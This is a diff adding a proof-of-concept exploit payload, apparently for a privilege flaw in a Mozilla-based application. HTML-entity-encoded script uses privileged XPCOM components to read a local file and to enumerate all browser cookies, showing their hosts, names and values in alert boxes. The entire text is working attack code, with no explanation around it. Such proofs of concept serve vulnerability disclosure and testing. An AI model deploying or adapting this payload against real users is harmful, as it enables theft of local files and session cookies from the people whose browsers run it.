@@ -1,0 +1,46 @@
+- -------------------------------------------------------------------------
+POC: Local File Reading and Cookie Reading (The HTML entities MUST be used)
+- -------------------------------------------------------------------------
+&lt;script&gt;
+
+function read(readfile)
+{
+    var file = Components.classes[&quot;@mozilla.org/file/local;1&quot;]
+             .createInstance(Components.interfaces.nsILocalFile);
+    file.initWithPath(readfile);
+    var is =
+Components.classes[&quot;@mozilla.org/network/file-input-stream;1&quot;]
+           .createInstance(Components.interfaces.nsIFileInputStream);
+    is.init(file, 0x01, 00004, null);
+    var sis =
+Components.classes[&quot;@mozilla.org/scriptableinputstream;1&quot;]
+            .createInstance(Components.interfaces.nsIScriptableInputStream);
+    sis.init(is);
+    var output = sis.read(sis.available());
+    alert(output);
+}
+read(&quot;C:\test.txt&quot;);
+
+function getCookies()
+{
+    var cookieManager =
+Components.classes[&quot;@mozilla.org/cookiemanager;1&quot;]
+                      .getService(Components.interfaces.nsICookieManager);
+    var str = '';
+    var iter = cookieManager.enumerator;
+    while (iter.hasMoreElements())
+    {
+        var cookie = iter.getNext();
+        if (cookie instanceof Components.interfaces.nsICookie)
+        {
+            str += &quot;Host: &quot; + cookie.host
+                 + &quot;\nName: &quot; + cookie.name
+                 + &quot;\nValue: &quot; + cookie.value
+                 + &quot;\n\n&quot;;
+        }
+    }
+    alert(str);
+}
+getCookies()
+
+&lt;/script&gt;
